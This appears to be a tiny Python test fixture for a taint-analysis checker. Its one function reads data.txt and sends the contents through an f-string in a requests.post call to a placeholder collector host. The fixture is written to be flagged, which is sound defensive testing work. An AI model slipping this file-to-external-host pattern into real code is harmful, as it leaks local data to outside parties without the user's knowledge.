"""bad_taint_fstring: file-read taint propagates through an f-string into requests.post."""
import requests


def send_wrapped():
    s = open("data.txt").read()
    requests.post("https://collector.example.com/ingest", data=f"value={s}")
